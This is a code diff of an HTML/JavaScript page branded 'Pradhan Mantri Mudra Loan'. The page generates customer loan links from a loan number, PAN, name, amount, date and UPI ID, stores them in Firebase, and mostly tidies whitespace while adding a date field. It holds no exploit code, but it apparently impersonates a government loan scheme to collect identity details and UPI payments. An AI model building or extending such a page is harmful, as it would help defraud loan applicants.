@@ -1,3 +1,4 @@
+```html
 <!DOCTYPE html>
 <html lang="en">
 
@@ -83,17 +84,13 @@ button:disabled{
 
 </head>
 
-
 <body>
-
 
 <div class="container">
 
 <img src="logo.png" class="logo">
 
-
 <h2>Pradhan Mantri Mudra Loan</h2>
-
 
 <!-- Loan Number -->
 
@@ -108,7 +105,6 @@ button:disabled{
     placeholder="Enter Loan Number"
 >
 
-
 <!-- PAN Number -->
 
 <label for="PanNumber">
@@ -122,7 +118,6 @@ button:disabled{
     placeholder="Enter PAN Number"
 >
 
-
 <!-- Customer -->
 
 <label for="customer">
@@ -134,7 +129,6 @@ button:disabled{
     id="customer"
     placeholder="Enter Customer Name"
 >
-
 
 <!-- Amount -->
 
@@ -160,6 +154,7 @@ button:disabled{
     maxlength="10"
     placeholder="Enter Loan Date"
 >
+
 <!-- UPI -->
 
 <label for="upi">
@@ -172,7 +167,6 @@ button:disabled{
     placeholder="Enter UPI ID"
 >
 
-
 <!-- Generate Button -->
 
 <button
@@ -182,7 +176,6 @@ button:disabled{
 >
     Generate Loan Link
 </button>
-
 
 <!-- Generated Link -->
 
@@ -197,7 +190,6 @@ button:disabled{
     placeholder="Generated link will appear here"
 >
 
-
 <!-- Copy Button -->
 
 <button
@@ -208,9 +200,7 @@ button:disabled{
     Copy Link
 </button>
 
-
 </div>
-
 
 <script type="module">
 
@@ -219,8 +209,6 @@ import {
     doc,
     setDoc
 } from "./firebase.js";
-
-
 
 /* =========================
    GENERATE LOAN LINK
@@ -231,7 +219,6 @@ window.generateLink = async function(){
     const btn =
         document.getElementById("generateBtn");
 
-
     /* Get values */
 
     const loan =
@@ -240,7 +227,6 @@ window.generateLink = async function(){
         .value
         .trim();
 
-
     const Pan =
         document
         .getElementById("PanNumber")
@@ -248,13 +234,11 @@ window.generateLink = async function(){
         .trim()
         .toUpperCase();
 
-
     const customer =
         document
         .getElementById("customer")
         .value
         .trim();
-
 
     const amount =
         document
@@ -263,15 +247,13 @@ window.generateLink = async function(){
         .trim();
 
     const loanDate =
-    document.getElementById("Loandate").value.trim();
+        document.getElementById("Loandate").value.trim();
 
-    
     const upi =
         document
         .getElementById("upi")
         .value
         .trim();
-
 
     /* =========================
        REQUIRED FIELD CHECK
@@ -291,7 +273,6 @@ window.generateLink = async function(){
         return;
     }
 
-
     /* =========================
        PAN CHECK
     ========================= */
@@ -307,7 +288,6 @@ window.generateLink = async function(){
         return;
     }
 
-
     /* =========================
        AMOUNT CHECK
     ========================= */
@@ -321,7 +301,6 @@ window.generateLink = async function(){
         return;
     }
 
-
     /* =========================
        BUTTON LOADING
     ========================= */
@@ -330,9 +309,7 @@ window.generateLink = async function(){
 
     btn.innerText = "Generating...";
 
-
     try{
-
 
         /* =========================
            SAVE TO FIREBASE
@@ -355,13 +332,14 @@ window.generateLink = async function(){
                 customer: customer,
 
                 amount: Number(amount),
-            
+
+                loanDate: loanDate,
+
                 upi: upi
 
             }
 
         );
-
 
         /* =========================
            CREATE CUSTOMER LINK
@@ -372,7 +350,6 @@ window.generateLink = async function(){
             "/admin.html?loan=" +
             encodeURIComponent(loan);
 
-
         /* =========================
            SHOW LINK
         ========================= */
@@ -381,16 +358,13 @@ window.generateLink = async function(){
             .getElementById("generatedLink")
             .value = link;
 
-
         console.log(
             "Loan Link Generated Successfully"
         );
 
-
         alert(
             "Loan link generated successfully!"
         );
-
 
     }
 
@@ -401,13 +375,11 @@ window.generateLink = async function(){
             error
         );
 
-
         alert(
             "Error: " + error.message
         );
 
     }
-
 
     finally{
 
@@ -422,8 +394,6 @@ window.generateLink = async function(){
 
 };
 
-
-
 /* =========================
    COPY LINK
 ========================= */
@@ -434,7 +404,6 @@ window.copyLink = async function(){
         document
         .getElementById("generatedLink");
 
-
     if(!link.value){
 
         alert(
@@ -444,18 +413,15 @@ window.copyLink = async function(){
         return;
     }
 
-
     try{
 
         await navigator
             .clipboard
             .writeText(link.value);
 
-
         alert(
             "Link copied successfully!"
         );
-
 
     }
 
@@ -473,6 +439,6 @@ window.copyLink = async function(){
 
 </script>
 
-
 </body>
 </html>
+```
